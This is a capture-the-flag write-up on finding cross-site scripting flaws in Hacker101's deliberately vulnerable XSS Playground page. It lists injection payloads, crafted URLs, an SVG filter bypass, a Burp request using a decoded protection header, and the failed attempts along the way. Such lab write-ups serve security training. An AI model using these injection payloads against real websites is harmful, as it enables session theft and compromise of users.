# XSS Playground by Zseano 

Can you find all of the XSS on this page? Use a keen eye and see if you can dsiver the following types of XSS

- 5 reflected
- 3 Stored
- 2 DOM Based
- 1 CSP Bypass
- 1 leak something

So let's see where we get one by one, including dead ends

### Comment XSS

Addng a comment to the page sets some DOM based javascript to the content

```html
<script>
    var commentContent = 'comment';
</script>
```

Therefore we can set the comment text to something like 

```x'; alert('comment');//```

Which gives 

```html
<script>
    var commentContent = 'x'; alert('comment');//';
</script>
```

### Searchterm modal XSS in redirecUrl link

This inline script is interesting

```html
  <script>

  var search = tracking.searchterm;
  var redirect = tracking.redirectUrl;
  if (search == null) { 
  } else {
    document.getElementById("searchterm").click();
    if (redirect == null) { 
      document.getElementById("redirectUrl").href="index.php";
    } else {
      document.getElementById("redirectUrl").href=redirect;
    }
  }

  </script>
```

Combined with the header of custom.js

```javascript
var hash = window.location.hash.substr(1);
var result = hash.split('&').reduce(function (e, t) {
  var n = t.split('=');
  return e[n[0]] = n[1],
  e
}, {
}
);
var tracking = JSON.stringify(result);
var who = (tracking = JSON.parse(tracking)).who;
```

A location of ```https://xxx.ctf.hacker101.com#searchterm=searchval&redirectUrl=redirectVal```

The value of result from the above will give a javascript object such as

```javascript
{
    searchterm: 'searchvalue',
    redirectUrl: 'redirectValue'
}
```

Let's focus on the redirecrUrl, we can see that if it's not null it will set the href attribute of the redirecUrl element id

```javascript
    if (redirect == null) { 
      document.getElementById("redirectUrl").href="index.php";
    } else {
      document.getElementById("redirectUrl").href=redirect;
    }
```

Eg.

```html
<a href="#" id="redirectUrl">Return to profile</a>
```

So if we construct a URL such as 

```https://xxx.ctf.hacker101.com/#redirectUrl=javascript:alert(1)&searchterm=hi```

We get XSS

### XSS Who?

Revisiting this snippet of code from custom.js

```javascript
var hash = window.location.hash.substr(1);
var result = hash.split('&').reduce(function (e, t) {
  var n = t.split('=');
  return e[n[0]] = n[1],
  e
}, {
}
);
var tracking = JSON.stringify(result);
var who = (tracking = JSON.parse(tracking)).who;
```

We can see who can be a property of the hash value and end up in the tracking object.

custom.js also has this snippet as the last line of the script

```javascript
1 == who.includes('zsh1') && document.write('<img src=/1x1.gif?' + decodeURI(who) + '></img>');
```

Ok so if who includes the value 'zsh1' we write an image that doesn't exist to the document, hmmmm ```onerror``` perhaps?

Could we get it to insert the following HTML as an example

```html
<img src=/1x1.gif? onerror=javascript:alert(1)></img>
```

PoC time using a URL such as ```https://xxx.ctf.hacker101.com/#who=zsh1```

Writes the following HTML

```html
<img src="/1x1.gif?zsh1">
```

Lets try closing the src attribute ```https://xxx.ctf.hacker101.com/#who=%22zsh1```

```html
<img src="/1x1.gif?&quot;zsh1">
```

Hmmm double encode the "? ```https://xxx.ctf.hacker101.com/#who=%2522zsh1```

```html
<img src="/1x1.gif?%22zsh1">
```

Nope, closing the image tag? ```https://xxx.ctf.hacker101.com/#who=>zsh1```

```html
<img src="/1x1.gif?">
zsh1>
```

Aha ok lets create our own script tags ```https://xxx.ctf.hacker101.com/#who=><script>alert('zsh1')</script>```

Yes!

### Referrer XSS

This is interesting, the referrer request header gets reflected in a script

```html
<script>
    var referrer = 'https://xxx.ctf.hacker101.com/';
    var is1337=false;
</script>
```

Using the previous exploit of the profile modal we can ommit the redirecUrl to get it to redirect us to index.php

```javascript
if (redirect == null) { 
    document.getElementById("redirectUrl").href="index.php";
}
```

Constructing a URL such as ```https://xxx.ctf.hacker101.com/?q=</script>#searchterm=x```. After redirect the above becomes

```html
<script>
    var referrer = 'https://xxx.ctf.hacker101.com/?q=%3C/script%3E';
    var is1337=false;
</script>
```

Can we end the string for the referrer var? ```https://xxx.ctf.hacker101.com/?q=%27;//#searchterm=x```

```html
<script>
    var referrer = 'https://xxx.ctf.hacker101.com/?q=%27;//';
    var is1337=false;
</script>
```

Double encoded? ```https://xxx.ctf.hacker101.com/?q=%2527;//#searchterm=x```

```html
<script>
    var referrer = 'https://xxx.ctf.hacker101.com/?q=%2527;//';
    var is1337=false;
</script>
```

What if I try a referer header value of ```https://xxx.ctf.hacker101.com/?q=';alert('referrer');//``` from burp repeater

OK this works, surely this is self XSS though? Hmmmm........

### Report user

The report user feature reflects the name into the review eg.

```html
<li>test — Pending review<i class="fas fa-user-clock" aria-hidden="true"></i></li>
```

```<script>``` tags are stripped from a name value of ```<script>alert(1)</script>```

```html
<li>alert(1) — Pending review<i class="fas fa-user-clock" aria-hidden="true"></i></li>
```

As are events ```<img src=x onerror=alert(1)>```

```html
<li><img src="x"> — Pending review<i class="fas fa-user-clock" aria-hidden="true"></i></li>
```

SVG payload of ```<svg/onload=alert(1) ``` however works - woot

```html
<li><svg onload="alert(1)" —="" pending="" review<i="" class="fas fa-user-clock" aria-hidden="true"></svg></li>
```

### Edit profile

The custom.js script has a function which is never actually called from the page

```javascript
function editProfile(e) {
  var t = new XMLHttpRequest;
  t.open('POST', 'api/action.php?act=editbio', !0),
  t.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'),
  t.setRequestHeader('X-SAFEPROTECTION', 'enNlYW5vb2Zjb3Vyc2U='),
  t.onreadystatechange = function () {
    this.readyState === XMLHttpRequest.DONE && this.status
  },
  t.send('bio=' + encodeURI(msg))
}
```

Call it from the console

```javascript
editProfile('awesome bio');
```

And we get

```html
<p class="w-75 mx-auto mb-3">[object HTMLTextAreaElement]</p>
```

It seems to encode the msg textarea DOM object in the script, so intercept it and set msg to

```html
<script>alert('awesome bio')</script>
```

And we get - another one done

```html
<p class="w-75 mx-auto mb-3">
    <script>alert('awesome bio')</script>
</p>
```

### Msg request/query param

OK so looking at the functions in custom.js we can see the value of the msg request param reflected on the page eg.

```javascript
t.onreadystatechange = function () {
    this.readyState === XMLHttpRequest.DONE && 200 === this.status && (top.location.href = 'index.php?msg=Thanks, your feedback has been received. We appreciate you sharing your feedback.')
  },
```

So can we inject simple HTML into it?

```https://xxx.ctf.hacker101.com/?msg=<a href="#">test</a>```

Result 

```html
<div class="alert alert-success" role="alert">
    &lt;a href="x"&gt;test&lt;/a&gt;
</div>
```

Hmmm escaped, what other characters are escaped to help us?

```https://xxx.ctf.hacker101.com/?msg=<>/';"```

Result

```html
<div class="alert alert-success" role="alert">
    &lt;&gt;/';"
</div>
```

Hmmm perhaps not, is there a way around the escaping of < and >?

If it's possible then given the above exploits could we construct a URL such as

```https://xxx.ctf.hacker101.com/#searchterm=x&redirectUrl=index.php?msg=evilxss```

### Not allowed to view emails?

So this probably isn't XSS per-se but apparently "You are not allowed to view emails" ok that sets my alarm bells ringing.

Back to custom.js, another function which isn't directly called from within the HTML

```javascript
function retrieveEmail(e) {
  var t = new XMLHttpRequest;
  t.open('GET', 'api/action.php?act=getemail', !0),
  t.setRequestHeader('X-SAFEPROTECTION', 'enNlYW5vb2Zjb3Vyc2U='),
  t.onreadystatechange = function () {
    this.readyState === XMLHttpRequest.DONE && this.status
  },
  t.send()
}
```

OK so there's a getemail act for the action API, with a request header X-SAFEPROTECTION, value looks like Base64

```
zseanoofcourse
```

Yup! OK lets call the function from the dev console and proxy to Burp

Request
```XML
GET /api/action.php?act=getemail HTTP/2
Host: xxx.ctf.hacker101.com
Cookie: _ga=GA1.2.2088535546.1649282063; _gid=GA1.2.2127104828.1652715494; welcome=1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Safeprotection: enNlYW5vb2Zjb3Vyc2U=
Referer: https://xxx.ctf.hacker101.com/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
```

Response
```XML
HTTP/2 200 OK
Date: Tue, 17 May 2022 22:18:23 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 0
Server: openresty/1.19.9.1
X-Powered-By: PHP/7.2.34
```

Hmmm not what I expected? This felt like the flag?!....

### Helper php?

Not sure why this is being linked to as script, it doesn't appear to do anything

```html
<script src="helper.php?v=1.0.0"></script>
```

The v parameter just reflects the parameter in the response which is why we see this in the console

```
Uncaught SyntaxError: unexpected token: numeric literal   helper.php:2:3
```

So if the value of v were some javascript it could evaluate it on the page....